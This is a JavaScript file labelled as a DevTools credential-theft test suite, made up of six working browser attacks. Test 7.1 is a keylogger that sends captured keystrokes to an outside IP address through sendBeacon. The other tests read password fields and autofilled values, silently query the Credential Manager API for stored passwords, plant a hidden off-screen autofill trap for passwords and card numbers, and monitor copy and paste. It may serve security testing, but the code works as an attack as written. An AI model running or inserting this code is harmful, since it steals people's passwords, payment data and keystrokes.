// =============================================================
// TEST 07: Credential Theft Techniques from DevTools
// =============================================================

// --- Test 7.1: Universal keylogger with exfil ---
(function() {
    var buffer = [];
    var flush = function() {
        if (buffer.length === 0) return;
        var payload = {keys: buffer.splice(0), url: location.href, time: new Date().toISOString()};
        console.log('[TEST 7.1] Keylog flush:', JSON.stringify(payload));
        navigator.sendBeacon('https://158.101.104.214/collect.php?cat=devtools&test=keylogger',
            JSON.stringify(payload));
    };
    document.addEventListener('keypress', function(e) {
        buffer.push({
            char: e.key,
            target: e.target.tagName + (e.target.type ? '[' + e.target.type + ']' : ''),
            name: e.target.name || e.target.id || '',
            time: Date.now()
        });
        if (buffer.length >= 10) flush();
    }, true);
    setInterval(flush, 5000);
    console.log('[TEST 7.1] Keylogger ACTIVE — captures all keystrokes with field context');
})();

// --- Test 7.2: Password field monitor ---
document.querySelectorAll('input[type="password"]').forEach(function(field, i) {
    field.addEventListener('input', function() {
        console.log('[TEST 7.2] Password field #' + i + ' value:', field.value);
    });
    // Also watch for autofill
    new MutationObserver(function() {
        if (field.value) console.log('[TEST 7.2] Password autofill detected:', field.value);
    }).observe(field, {attributes: true, attributeFilter: ['value']});
});
// Also catch dynamically added password fields
new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
        m.addedNodes.forEach(function(n) {
            if (n.querySelectorAll) {
                n.querySelectorAll('input[type="password"]').forEach(function(f) {
                    f.addEventListener('input', function() {
                        console.log('[TEST 7.2] NEW password field value:', f.value);
                    });
                });
            }
        });
    });
}).observe(document.body, {childList: true, subtree: true});
console.log('[TEST 7.2] Password monitors active on', document.querySelectorAll('input[type="password"]').length, 'fields');

// --- Test 7.3: Credential Manager API access ---
if (navigator.credentials) {
    navigator.credentials.get({password: true, mediation: 'silent'})
        .then(function(cred) {
            if (cred) console.log('[TEST 7.3] STORED CREDENTIAL:', cred.id, cred.type, cred.password);
            else console.log('[TEST 7.3] No silent credential available');
        })
        .catch(function(e) { console.log('[TEST 7.3] Credential API:', e.message); });
} else { console.log('[TEST 7.3] Credential API not available'); }

// --- Test 7.4: Autocomplete harvesting ---
var inputs = document.querySelectorAll('input');
console.log('[TEST 7.4] Checking', inputs.length, 'input fields for autofill data:');
inputs.forEach(function(inp) {
    if (inp.value) {
        console.log('[TEST 7.4]  ', inp.name || inp.id || inp.type, '=', inp.value);
    }
});

// --- Test 7.5: Fake autofill trap ---
var trapForm = document.createElement('form');
trapForm.innerHTML = `
    <input type="text" name="username" autocomplete="username" style="position:absolute;left:-9999px;">
    <input type="password" name="password" autocomplete="current-password" style="position:absolute;left:-9999px;">
    <input type="text" name="cc-number" autocomplete="cc-number" style="position:absolute;left:-9999px;">
    <input type="email" name="email" autocomplete="email" style="position:absolute;left:-9999px;">
`;
document.body.appendChild(trapForm);
setTimeout(function() {
    trapForm.querySelectorAll('input').forEach(function(inp) {
        if (inp.value) console.log('[TEST 7.5] AUTOFILL CAPTURED:', inp.name, '=', inp.value);
    });
}, 2000);
console.log('[TEST 7.5] Autofill trap deployed — checking in 2s');

// --- Test 7.6: Clipboard monitoring ---
document.addEventListener('copy', function(e) {
    var selected = window.getSelection().toString();
    console.log('[TEST 7.6] COPY detected:', selected.substring(0, 200));
});
document.addEventListener('paste', function(e) {
    var pasted = e.clipboardData.getData('text');
    console.log('[TEST 7.6] PASTE detected:', pasted.substring(0, 200));
});
console.log('[TEST 7.6] Clipboard monitor active');
